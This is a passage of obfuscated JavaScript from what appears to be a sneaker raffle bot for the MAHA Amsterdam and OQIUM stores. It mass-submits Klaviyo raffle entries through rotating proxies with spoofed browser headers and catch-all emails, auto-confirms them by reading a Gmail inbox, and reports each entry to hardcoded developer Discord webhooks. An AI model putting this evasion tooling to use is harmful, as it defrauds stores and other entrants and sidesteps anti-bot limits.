                                _0x5a1c53['errorDEV'] = { 'embeds': [_0x13e66c] }, _0x37a01c['webhook'] != undefined && _0x37a01c['webhook'] != '' && await _0x21228b(_0x37a01c['webhook'], _0x5a1c53['errorDEV']), await _0x21228b(_0x549818, _0x5a1c53['errorDEV']);
                            }
                        } catch (_0x1f48d1) {
                            console['log'](_0x41d282['red'](_0x223c9e() + '\x20[' + _0x131733['name'] + ']\x20Task\x20' + (_0x59d9b4 + 0x1) + '\x20:\x20' + _0x1f48d1)), _0x124066 = '' + _0x1f48d1;
                            var _0x13e66c = await _0x550a27(_0x13ced4[_0x59d9b4], _0x131733, 'dev', !![], _0x124066);
                            _0x5a1c53['errorDEV'] = { 'embeds': [_0x13e66c] }, _0x37a01c['webhook'] != undefined && _0x37a01c['webhook'] != '' && await _0x21228b(_0x37a01c['webhook'], _0x5a1c53['errorDEV']), await _0x21228b(_0x549818, _0x5a1c53['errorDEV']), _0x235479 = 'yes';
                        } finally {
                            _0x142667 && _0x142667['close']();
                            if (_0x235479 == 'yes' && _0x3cba4f != 0x5) {
                                console['log'](_0x41d282['red'](_0x223c9e() + '\x20[' + _0x131733['name'] + ']\x20Task\x20' + (_0x59d9b4 + 0x1) + '\x20:\x20Retrying')), _0x59d9b4 = _0x59d9b4 - 0x1, _0x3cba4f = _0x3cba4f + 0x1;
                                continue;
                            }
                            _0x235479 == 'yes' && _0x3cba4f >= 0x5 && (_0x2e4d36(_0x13ced4[_0x59d9b4], _0x131733), _0x235479 = 'no', _0x3cba4f = 0x0), console['log']('Waiting\x20for\x20' + _0x37a01c['AfewDelay'] + '\x20ms'), await _0x1a79bd(_0x37a01c['AfewDelay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'MAHA\x20Amsterdam',
        'modules': [
            {
                'name': 'MAHA\x20Raffle\x20Entries',
                'store': 'MAHA',
                'logo': 'https://i1.sndcdn.com/avatars-XIAMNs5LPWV2iRwj-SNwa5A-t500x500.jpg',
                'url': 'https://a.klaviyo.com/client/subscriptions/?company_id=THxSew',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'RvxrAV',
                            'custom_source': 'Air\x20Jordan\x201\x20High\x20OG\x20\x27White\x20Cement\x27',
                            'email': '',
                            'properties': {
                                '$address1': '',
                                '$city': '',
                                '$country': '',
                                '$first_name': '',
                                '$last_name': '',
                                '$zip': '',
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'WQN5XR',
                                '$consent_form_version': 0x7f7254,
                                'Instagram\x20Handle': '',
                                'Shipping': 'Shipping',
                                'Size': '',
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x1
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://www.maha-amsterdam.com',
                    'referer': 'https://www.maha-amsterdam.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                },
                'function': async function (_0x491797, _0x5f3682, _0x5f2bce) {
                    for (var _0x5e166d = 0x0; _0x5e166d < _0x5f3682['length']; _0x5e166d++) {
                        async function _0x1fda56(_0x6e8ff9, _0x4b30fe, _0x2e5c6c, _0x35de90, _0x1adb6e) {
                            var _0x45733b, _0x3169a5 = {}, _0x4baaf3 = [], _0x472889 = {}, _0x58b1b1 = [
                                '40',
                                '40,5',
                                '41',
                                '42',
                                '42,5',
                                '43',
                                '44',
                                '45',
                                '45,5',
                                '46',
                                '47',
                                '47,5',
                                '48'
                            ], _0x382e7e = Math['round'](Math['random']() * (_0x58b1b1['length'] - 0x1));
                            _0x35de90[_0x6e8ff9]['Size'] == 'RANDOM' && (_0x35de90[_0x6e8ff9]['Size'] = _0x58b1b1[_0x382e7e]);
                            !_0x35de90 && (_0x35de90 = {});
                            if (_0x4b30fe != 'ver') {
                                _0x219354(_0x2e5c6c['name'] + '\x20Task\x20' + (_0x6e8ff9 + 0x1) + '\x20/\x20' + _0x35de90['length'] + '\x20||\x20File:\x20' + _0x4e44e9 + '\x20Proxies:\x20' + _0xd50a79), await _0x170817(_0x35de90, _0x6e8ff9), _0x3169a5 = _0x2e5c6c['data'];
                                _0x4b30fe == 'exp' ? _0x3169a5['data']['attributes']['email'] = '' + _0x35de90[_0x6e8ff9]['FirstName'] + _0x35de90[_0x6e8ff9]['LastName'] + _0x37a01c['catchall'] : _0x3169a5['data']['attributes']['email'] = '' + _0x35de90[_0x6e8ff9]['Email'];
                                if (_0x35de90[_0x6e8ff9]['Size'] == 'RANDOM') {
                                }
                                _0x3169a5['data']['attributes']['properties']['$first_name'] = '' + _0x35de90[_0x6e8ff9]['FirstName'], _0x3169a5['data']['attributes']['properties']['$last_name'] = '' + _0x35de90[_0x6e8ff9]['LastName'], _0x3169a5['data']['attributes']['properties']['$address1'] = _0x35de90[_0x6e8ff9]['Address1'] + '\x20' + _0x35de90[_0x6e8ff9]['Address2'] + '\x20' + _0x35de90[_0x6e8ff9]['HouseNumber'], _0x3169a5['data']['attributes']['properties']['$zip'] = '' + _0x35de90[_0x6e8ff9]['Zip'], _0x3169a5['data']['attributes']['properties']['$city'] = '' + _0x35de90[_0x6e8ff9]['City'], _0x3169a5['data']['attributes']['properties']['$country'] = '' + _0x35de90[_0x6e8ff9]['Country'], _0x3169a5['data']['attributes']['properties']['Size'] = '' + _0x35de90[_0x6e8ff9]['Size'], _0x3169a5['data']['attributes']['properties']['$phone_number'] = '' + _0x35de90[_0x6e8ff9]['Phone'], _0x3169a5['data']['attributes']['properties']['Instagram\x20Account'] = '' + _0x35de90[_0x6e8ff9]['Follower'];
                            }
                            if (_0x37a01c['useRandomProxy'] = ![])
                                var _0x26618a = _0x1adb6e[_0x6e8ff9]['split'](':');
                            else
                                var _0x51b2c8 = Math['round'](Math['random']() * (_0x1adb6e['length'] - 0x1)), _0x26618a = _0x1adb6e[_0x51b2c8]['split'](':');
                            var _0x393eca = {
                                'jar': _0x2b4f8d,
                                'followAllRedirects': !![],
                                'method': 'POST',
                                'url': _0x2e5c6c['url'],
                                'headers': _0x2e5c6c['headers'],
                                'body': JSON['stringify'](_0x3169a5),
                                'proxy': 'http://' + _0x26618a[0x2] + ':' + _0x26618a[0x3] + '@' + _0x26618a[0x0] + ':' + _0x26618a[0x1]
                            };
                            return _0x4b30fe != 'ver' && (_0x393eca['url'] = _0x2e5c6c['url'], _0x393eca['headers'] = _0x2e5c6c['headers']), _0x4b30fe == 'ver' && (_0x393eca['method'] = 'GET'), new Promise(function (_0x36e4fe, _0x2e4db3) {
                                callback = async (_0x3b7b05, _0x1fe3f8, _0x1fc66a) => {
                                    if (!_0x3b7b05 && _0x1fe3f8['statusCode'] == 0xca || !_0x3b7b05 && _0x1fe3f8['statusCode'] == 0xc8) {
                                        if (_0x4b30fe != 'ver') {
                                            var _0x1e374d = await _0x550a27(_0x35de90[_0x6e8ff9], _0x2e5c6c, 'dev', ![]), _0xd5902b = await _0x550a27(_0x35de90[_0x6e8ff9], _0x2e5c6c, 'pub', ![]);
                                            const _0x44213c = {
                                                'succesDEVMSG': { 'embeds': [_0x1e374d] },
                                                'succesPUBMSG': { 'embeds': [_0xd5902b] }
                                            };
                                            if (_0x37a01c['webhook'] != undefined && _0x37a01c['webhook'] != '')
                                                try {
                                                    await _0x21228b(_0x37a01c['webhook'], _0x44213c['succesDEVMSG']);
                                                } catch {
                                                }
                                            await _0x1a79bd(0xc8), await _0x21228b(_0x152092, _0x44213c['succesDEVMSG']), await _0x1a79bd(0xc8);
                                            try {
                                                await _0x21228b(_0x136ee7, _0x44213c['succesPUBMSG']);
                                            } catch {
                                            }
                                            _0x4c6d06(_0x35de90[_0x6e8ff9], _0x2e5c6c);
                                        }
                                        _0x36e4fe(console['log'](_0x41d282['green'](_0x223c9e() + '\x20[' + _0x2e5c6c['name'] + ']\x20Task\x20' + (_0x6e8ff9 + 0x1) + ':\x20Raffle\x20Entered!')));
                                    } else {
                                        if (_0x4b30fe != 'ver') {
                                            var _0x391c32 = '' + _0x3b7b05, _0xe981bb = await _0x550a27(_0x35de90[_0x6e8ff9], _0x2e5c6c, 'dev', !![], _0x391c32), _0x25d0b4 = {};
                                            _0x25d0b4['errorDEV'] = { 'embeds': [_0xe981bb] }, _0x2e4d36(_0x35de90[_0x6e8ff9], _0x2e5c6c), _0x37a01c['webhook'] != undefined && _0x37a01c['webhook'] != '' && await _0x21228b(_0x37a01c['webhook'], _0x25d0b4['errorDEV']), await _0x21228b(_0x549818, _0x25d0b4['errorDEV']);
                                        }
                                        _0x2e4db3(console['log'](_0x41d282['red'](_0x223c9e() + '\x20[' + _0x2e5c6c['name'] + ']\x20Task\x20' + (_0x6e8ff9 + 0x1) + ':\x20' + _0x3b7b05)));
                                    }
                                };
                                try {
                                    _0x4b30fe != 'ver' && console['log'](_0x223c9e() + '\x20[' + _0x2e5c6c['name'] + ']\x20Task\x20' + (_0x6e8ff9 + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x3169a5['data']['attributes']['email']), _0x45dd39(_0x393eca, callback);
                                } catch (_0x144f07) {
                                    console['log'](_0x223c9e() + '\x20Task\x20' + (_0x6e8ff9 + 0x1) + ':\x20' + _0x144f07);
                                }
                            });
                        }
                        ;
                        try {
                            await _0x1fda56(_0x5e166d, 'nor', _0x491797, _0x5f3682, _0x5f2bce), console['log'](_0x223c9e() + '\x20[' + _0x491797['name'] + ']\x20Sleeping\x20for\x20' + _0x37a01c['delay'] + '\x20ms'), await _0x1a79bd(_0x37a01c['delay']);
                        } catch (_0x173d05) {
                        }
                    }
                }
            },
            {
                'name': 'MAHA\x20Raffle\x20Verification',
                'store': 'MAHA',
                'logo': 'https://i1.sndcdn.com/avatars-XIAMNs5LPWV2iRwj-SNwa5A-t500x500.jpg',
                'url': '',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'TFTWYv',
                            'custom_source': 'Air\x20Jordan\x201\x20Retro\x20High\x20OG\x20Lost\x20and\x20Found',
                            'email': '',
                            'properties': {
                                '$address1': '',
                                '$city': '',
                                '$country': '',
                                '$first_name': '',
                                '$last_name': '',
                                '$zip': '',
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'V4PNGA',
                                '$consent_form_version': 0x6fd46d,
                                'Instagram\x20Handle': '',
                                'Shipping': 'Shipping',
                                'Size': '',
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x1
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://www.maha-amsterdam.com',
                    'referer': 'https://www.maha-amsterdam.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                },
                'function': async function (_0x23e4db, _0x457b6d, _0x193149) {
                    var _0x2c57a8 = [];
                    async function _0x5e47bb() {
                        var _0x3a33b3 = new _0x27a360({
                            'user': _0x37a01c['masterMail'],
                            'password': _0x37a01c['masterPassword'],
                            'host': 'imap.gmail.com',
                            'port': 0x3e1,
                            'tls': !![],
                            'autotls': 'always'
                        });
                        function _0x254381(_0x446dc4) {
                            _0x3a33b3['openBox']('INBOX', ![], _0x446dc4);
                        }
                        _0x3a33b3['once']('ready', function () {
                            _0x254381(function (_0x3d74c0, _0x15475b) {
                                console['clear'](), console['log']('Looking\x20For\x20Links');
                                if (_0x3d74c0)
                                    throw _0x3d74c0;
                                _0x3a33b3['seq']['search'](['UNSEEN'], function (_0x2760f7, _0x4548a1) {
                                    if (!_0x4548a1 || !_0x4548a1['length'])
                                        console['log'](_0x223c9e() + '\x20[' + _0x23e4db['name'] + ']\x20No\x20mails\x20found'), _0x3a33b3['end']();
                                    else {
                                        var _0xb8dd69 = _0x3a33b3['seq']['fetch'](_0x4548a1, {
                                            'bodies': '',
                                            'markSeen': !![]
                                        });
                                        _0xb8dd69['on']('message', function (_0x8a3b51, _0x4ea77a) {
                                            var _0x5754ca = '(#' + _0x4ea77a + ')\x20';
                                            _0x8a3b51['on']('body', function (_0x139bb9, _0x22f1b6) {
                                                _0x5d77b8(_0x139bb9, (_0x5ede84, _0x5a55db) => {
                                                    if (_0x5a55db['subject'] == 'Confirm\x20Your\x20Subscription' && _0x5a55db['from']['value'][0x0]['name'] == 'Maha\x20Amsterdam') {
                                                        var _0x4fce25 = _0x5a55db['text']['split']('(')[0x1], _0x261175 = _0x4fce25['split'](')')[0x0];
                                                        _0x2c57a8['push'](_0x261175);
                                                    }
                                                });
                                            }), _0x8a3b51['once']('end', function () {
                                            });
                                        }), _0xb8dd69['once']('error', function (_0x371a47) {
                                            console['log']('Fetch\x20error:\x20' + _0x371a47);
                                        }), _0xb8dd69['once']('end', function () {
                                            _0x3a33b3['end']();
                                        });
                                    }
                                });
                            });
                        }), _0x3a33b3['once']('error', function (_0x4599f1) {
                            console['log'](_0x41d282['red'](_0x4599f1['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox');
                        }), _0x3a33b3['once']('end', async function () {
                        }), _0x3a33b3['connect']();
                    }
                    async function _0x368708(_0x391d13, _0x34052a, _0x501ee0) {
                        for (var _0x3cfbee = 0x0; _0x3cfbee < _0x34052a['length']; _0x3cfbee++) {
                            async function _0x5832cb(_0x3905d4, _0x42a07b, _0x2afaee, _0x4af943, _0x435d08) {
                                var _0x513aad, _0x20858a = {}, _0x37f264 = [], _0x3ef430 = {}, _0x5742e4 = [
                                    '40',
                                    '40,5',
                                    '41',
                                    '42',
                                    '42,5',
                                    '43',
                                    '44',
                                    '45',
                                    '45,5',
                                    '46',
                                    '47',
                                    '47,5',
                                    '48'
                                ], _0xda90d0 = Math['round'](Math['random']() * (_0x5742e4['length'] - 0x1));
                                _0x4af943[_0x3905d4]['Size'] == 'RANDOM' && (_0x4af943[_0x3905d4]['Size'] = _0x5742e4[_0xda90d0]);
                                !_0x4af943 && (_0x4af943 = {});
                                if (_0x37a01c['useRandomProxy'] = ![])
                                    var _0x1fd5a2 = _0x435d08[_0x3905d4]['split'](':');
                                else
                                    var _0x58eef7 = Math['round'](Math['random']() * (_0x435d08['length'] - 0x1)), _0x1fd5a2 = _0x435d08[_0x58eef7]['split'](':');
                                var _0x4d1a09 = {
                                    'jar': _0x2b4f8d,
                                    'followAllRedirects': !![],
                                    'method': 'POST',
                                    'url': _0x2afaee['url'],
                                    'headers': _0x2afaee['headers'],
                                    'body': JSON['stringify'](_0x20858a),
                                    'proxy': 'http://' + _0x1fd5a2[0x2] + ':' + _0x1fd5a2[0x3] + '@' + _0x1fd5a2[0x0] + ':' + _0x1fd5a2[0x1]
                                };
                                return _0x42a07b != 'ver' && (_0x4d1a09['url'] = _0x2afaee['url'], _0x4d1a09['headers'] = _0x2afaee['headers']), _0x42a07b == 'ver' && (_0x4d1a09['method'] = 'GET', _0x4d1a09['url'] = _0x4af943[_0x3905d4]), new Promise(function (_0x33a5b6, _0x13bb4c) {
                                    callback = async (_0x5cf769, _0x3a8faa, _0xa921e1) => {
                                        if (!_0x5cf769 && _0x3a8faa['statusCode'] == 0xca || !_0x5cf769 && _0x3a8faa['statusCode'] == 0xc8) {
                                            if (_0x42a07b != 'ver') {
                                                var _0x3c795e = await _0x550a27(_0x4af943[_0x3905d4], _0x2afaee, 'dev', ![]), _0x1f4ddc = await _0x550a27(_0x4af943[_0x3905d4], _0x2afaee, 'pub', ![]);
                                                const _0x1cc6af = {
                                                    'succesDEVMSG': { 'embeds': [_0x3c795e] },
                                                    'succesPUBMSG': { 'embeds': [_0x1f4ddc] }
                                                };
                                                if (_0x37a01c['webhook'] != undefined && _0x37a01c['webhook'] != '')
                                                    try {
                                                        await _0x21228b(_0x37a01c['webhook'], _0x1cc6af['succesDEVMSG']);
                                                    } catch {
                                                    }
                                                await _0x1a79bd(0xc8), await _0x21228b(_0x152092, _0x1cc6af['succesDEVMSG']), await _0x1a79bd(0xc8);
                                                try {
                                                    await _0x21228b(_0x136ee7, _0x1cc6af['succesPUBMSG']);
                                                } catch {
                                                }
                                                _0x4c6d06(_0x4af943[_0x3905d4], _0x2afaee);
                                            }
                                            _0x33a5b6(console['log'](_0x41d282['green'](_0x223c9e() + '\x20[' + _0x2afaee['name'] + ']\x20Task\x20' + (_0x3905d4 + 0x1) + ':\x20Raffle\x20Entered!')));
                                        } else {
                                            if (_0x42a07b != 'ver') {
                                                var _0x12f0e1 = '' + _0x5cf769, _0x109001 = await _0x550a27(_0x4af943[_0x3905d4], _0x2afaee, 'dev', !![], _0x12f0e1), _0x291f38 = {};
                                                _0x291f38['errorDEV'] = { 'embeds': [_0x109001] }, _0x2e4d36(_0x4af943[_0x3905d4], _0x2afaee), _0x37a01c['webhook'] != undefined && _0x37a01c['webhook'] != '' && await _0x21228b(_0x37a01c['webhook'], _0x291f38['errorDEV']), await _0x21228b(_0x549818, _0x291f38['errorDEV']);
                                            }
                                            _0x13bb4c(console['log'](_0x41d282['red'](_0x223c9e() + '\x20[' + _0x2afaee['name'] + ']\x20Task\x20' + (_0x3905d4 + 0x1) + ':\x20' + _0x5cf769)));
                                        }
                                    };
                                    try {
                                        _0x42a07b != 'ver' ? console['log'](_0x223c9e() + '\x20[' + _0x2afaee['name'] + ']\x20Task\x20' + (_0x3905d4 + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x20858a['data']['attributes']['email']) : console['log'](_0x223c9e() + '\x20[' + _0x2afaee['name'] + ']\x20Task\x20' + (_0x3905d4 + 0x1) + ':\x20Fetching\x20Response'), _0x45dd39(_0x4d1a09, callback);
                                    } catch (_0x39f31f) {
                                        console['log'](_0x223c9e() + '\x20Task\x20' + (_0x3905d4 + 0x1) + ':\x20' + _0x39f31f);
                                    }
                                });
                            }
                            ;
                            try {
                                await _0x5832cb(_0x3cfbee, 'ver', _0x391d13, _0x34052a, _0x501ee0), console['log'](_0x223c9e() + '\x20[' + _0x391d13['name'] + ']\x20Sleeping\x20for\x20' + _0x37a01c['delay'] + '\x20ms'), await _0x1a79bd(_0x37a01c['delay']);
                            } catch (_0x8592e3) {
                            }
                        }
                    }
                    try {
                        _0x5e47bb(), await _0x1a79bd(0xfa0), console['log']('Found\x20' + _0x2c57a8['length'] + '\x20Links\x20in\x20Mailbox');
                    } catch {
                        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..'), await _0x1a79bd(0x9c4);
                    }
                    await _0x368708(_0x23e4db, _0x2c57a8, _0x193149);
                }
            }
        ]
    },
    {
        'name': 'OQIUM\x20Store',
        'modules': [
            {
                'name': 'OQIUM\x20Raffle\x20Entries',
                'store': 'OQIUM',
                'logo': 'https://s3-eu-west-1.amazonaws.com/tpd/logos/5e8e742e8f9bb4000118f0bc/0x0.png',
                'url': 'https://a.klaviyo.com/client/subscriptions/?company_id=R3sbqs',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'RsxJgQ',
                            'custom_source': 'DV6989-100',
                            'email': '',
                            'properties': {
                                '$first_name': '',
                                '$last_name': '',
                                '$phone_number': '',
                                'Size': '',
                                'Instagram\x20Account': '',
                                '$address1': '',
                                '$zip': '',
                                '$city': '',
                                '$country': '',
                                'Accepts\x20Marketing': ['NoByRaffle'],
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'TiDS2V',
                                '$consent_form_version': 0x80926b,
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x1
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://oqium.com',
                    'referer': 'https://oqium.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                },
                'function': async function (_0x382a4e, _0x502c28, _0x1b63d5) {
                    for (var _0x566fef = 0x0; _0x566fef < _0x502c28['length']; _0x566fef++) {
                        async function _0x43ed24(_0x2ef6a1, _0xce4934, _0x25cc10, _0x47c932, _0x1115c9) {
                            var _0xbb516a, _0x509b0c = {}, _0x21fe82 = [], _0x134551 = {}, _0x2fca8f = [
                                '40',
                                '40,5',
                                '41',
                                '42',
                                '42,5',
                                '43',
                                '44',
                                '45',
                                '45,5',
                                '46',
                                '47',
                                '47,5',
                                '48'
                            ], _0x3ae606 = Math['round'](Math['random']() * (_0x2fca8f['length'] - 0x1));
                            _0x47c932[_0x2ef6a1]['Size'] == 'RANDOM' && (_0x47c932[_0x2ef6a1]['Size'] = _0x2fca8f[_0x3ae606]);
                            !_0x47c932 && (_0x47c932 = {});
                            if (_0xce4934 != 'ver') {
                                _0x219354(_0x25cc10['name'] + '\x20Task\x20' + (_0x2ef6a1 + 0x1) + '\x20/\x20' + _0x47c932['length'] + '\x20||\x20File:\x20' + _0x4e44e9 + '\x20Proxies:\x20' + _0xd50a79), await _0x170817(_0x47c932, _0x2ef6a1), _0x21fe82 = [{
                                    'type': 'rich',
                                    'title': 'Succesful\x20OQIUM\x20Entry',
                                    'description': '',
                                    'color': 0xc0d6d6,
                                    'fields': [
                                        {
                                            'name': 'User',
                                            'value': '' + _0x3da10f
                                        },
                                        {
                                            'name': 'Size',
                                            'value': '' + _0x47c932[_0x2ef6a1]['Size']
                                        },
                                        {
                                            'name': 'Delay',
                                            'value': '' + _0x37a01c['delay']
                                        },
                                        {
                                            'name': 'Version',
                                            'value': '' + _0x3dc3b3
                                        }
                                    ]
                                }], _0x134551 = { 'embeds': _0x21fe82 }, _0x509b0c = _0x25cc10['data'];
                                _0xce4934 == 'exp' ? _0x509b0c['data']['attributes']['email'] = '' + _0x47c932[_0x2ef6a1]['FirstName'] + _0x47c932[_0x2ef6a1]['LastName'] + _0x37a01c['catchall'] : _0x509b0c['data']['attributes']['email'] = '' + _0x47c932[_0x2ef6a1]['Email'];
                                if (_0x47c932[_0x2ef6a1]['Size'] == 'RANDOM') {
                                }
                                _0x509b0c['data']['attributes']['properties']['$first_name'] = '' + _0x47c932[_0x2ef6a1]['FirstName'], _0x509b0c['data']['attributes']['properties']['$last_name'] = '' + _0x47c932[_0x2ef6a1]['LastName'], _0x509b0c['data']['attributes']['properties']['$address1'] = _0x47c932[_0x2ef6a1]['Address1'] + '\x20' + _0x47c932[_0x2ef6a1]['Address2'] + '\x20' + _0x47c932[_0x2ef6a1]['HouseNumber'], _0x509b0c['data']['attributes']['properties']['$zip'] = '' + _0x47c932[_0x2ef6a1]['Zip'], _0x509b0c['data']['attributes']['properties']['$city'] = '' + _0x47c932[_0x2ef6a1]['City'], _0x509b0c['data']['attributes']['properties']['$country'] = '' + _0x47c932[_0x2ef6a1]['Country'], _0x509b0c['data']['attributes']['properties']['Size'] = 'US\x20W\x20/\x20EU\x20' + _0x47c932[_0x2ef6a1]['Size'], _0x509b0c['data']['attributes']['properties']['$phone_number'] = '' + _0x47c932[_0x2ef6a1]['Phone'], _0x509b0c['data']['attributes']['properties']['Instagram\x20Account'] = '' + _0x47c932[_0x2ef6a1]['Follower'];
                            }
                            if (_0x37a01c['useRandomProxy'] = ![])
                                var _0x403231 = _0x1115c9[_0x2ef6a1]['split'](':');
                            else
                                var _0x3905e9 = Math['round'](Math['random']() * (_0x1115c9['length'] - 0x1)), _0x403231 = _0x1115c9[_0x3905e9]['split'](':');
                            var _0x1d3f72 = {
                                'jar': _0x2b4f8d,
                                'followAllRedirects': !![],
                                'method': 'POST',
                                'url': _0x25cc10['url'],
                                'headers': _0x25cc10['headers'],
                                'body': JSON['stringify'](_0x509b0c),
                                'proxy': 'http://' + _0x403231[0x2] + ':' + _0x403231[0x3] + '@' + _0x403231[0x0] + ':' + _0x403231[0x1]
                            };
                            return _0xce4934 != 'ver' && (_0x1d3f72['url'] = _0x25cc10['url'], _0x1d3f72['headers'] = _0x25cc10['headers']), _0xce4934 == 'ver' && (_0x1d3f72['method'] = 'GET'), new Promise(function (_0xd67f28, _0x296bf0) {
                                callback = async (_0x4bcc99, _0x12d95a, _0x2a596f) => {
                                    if (!_0x4bcc99 && _0x12d95a['statusCode'] == 0xca || !_0x4bcc99 && _0x12d95a['statusCode'] == 0xc8) {
                                        if (_0xce4934 != 'ver') {
                                            var _0x13578e = await _0x550a27(_0x47c932[_0x2ef6a1], _0x25cc10, 'dev', ![]), _0x1f20e0 = await _0x550a27(_0x47c932[_0x2ef6a1], _0x25cc10, 'pub', ![]);
                                            const _0x3f4870 = {
                                                'succesDEVMSG': { 'embeds': [_0x13578e] },
                                                'succesPUBMSG': { 'embeds': [_0x1f20e0] }
                                            };
                                            if (_0x37a01c['webhook'] != undefined && _0x37a01c['webhook'] != '')
                                                try {
                                                    await _0x21228b(_0x37a01c['webhook'], _0x3f4870['succesDEVMSG']);
                                                } catch {
                                                }
                                            await _0x1a79bd(0xc8), await _0x21228b(_0x152092, _0x3f4870['succesDEVMSG']), await _0x1a79bd(0xc8);
                                            try {
                                                await _0x21228b(_0x136ee7, _0x3f4870['succesPUBMSG']);
                                            } catch {
                                            }
                                            _0x4c6d06(_0x47c932[_0x2ef6a1], _0x25cc10);
                                        }
                                        _0xd67f28(console['log'](_0x41d282['green'](_0x223c9e() + '\x20[' + _0x25cc10['name'] + ']\x20Task\x20' + (_0x2ef6a1 + 0x1) + ':\x20Raffle\x20Entered!')));
                                    } else {
                                        if (_0xce4934 != 'ver') {
                                            var _0x2bc1a8 = '' + _0x4bcc99, _0x1ae4be = await _0x550a27(_0x47c932[_0x2ef6a1], _0x25cc10, 'dev', !![], _0x2bc1a8), _0x51d1e0 = {};
                                            _0x51d1e0['errorDEV'] = { 'embeds': [_0x1ae4be] }, _0x2e4d36(_0x47c932[_0x2ef6a1], _0x25cc10), _0x37a01c['webhook'] != undefined && _0x37a01c['webhook'] != '' && await _0x21228b(_0x37a01c['webhook'], _0x51d1e0['errorDEV']), await _0x21228b(_0x549818, _0x51d1e0['errorDEV']);
                                        }
                                        _0x296bf0(console['log'](_0x41d282['red'](_0x223c9e() + '\x20[' + _0x25cc10['name'] + ']\x20Task\x20' + (_0x2ef6a1 + 0x1) + ':\x20' + _0x4bcc99)));
                                    }
                                };
                                try {
                                    _0xce4934 != 'ver' && console['log'](_0x223c9e() + '\x20[' + _0x25cc10['name'] + ']\x20Task\x20' + (_0x2ef6a1 + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x509b0c['data']['attributes']['email']), _0x45dd39(_0x1d3f72, callback);
                                } catch (_0x41a16a) {
                                    console['log'](_0x223c9e() + '\x20Task\x20' + (_0x2ef6a1 + 0x1) + ':\x20' + _0x41a16a);
                                }
                            });
                        }
                        ;
                        try {
                            await _0x43ed24(_0x566fef, 'nor', _0x382a4e, _0x502c28, _0x1b63d5), console['log'](_0x223c9e() + '\x20[' + _0x382a4e['name'] + ']\x20Sleeping\x20for\x20' + _0x37a01c['delay'] + '\x20ms'), await _0x1a79bd(_0x37a01c['delay']);
                        } catch (_0x391d41) {
                        }
                    }
                }
            },
            {
                'name': 'OQIUM\x20Raffle\x20Verification',
                'url': '',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'TFTWYv',
                            'custom_source': 'Air\x20Jordan\x201\x20Retro\x20High\x20OG\x20Lost\x20and\x20Found',
                            'email': '',
                            'properties': {
                                '$address1': '',
                                '$city': '',
                                '$country': '',
                                '$first_name': '',
                                '$last_name': '',
                                '$zip': '',
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'V4PNGA',
                                '$consent_form_version': 0x6fd46d,
                                'Instagram\x20Handle': '',
                                'Shipping': 'Shipping',
                                'Size': '',
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x1
                            }
                        }
                    }
                },
                'headers': {
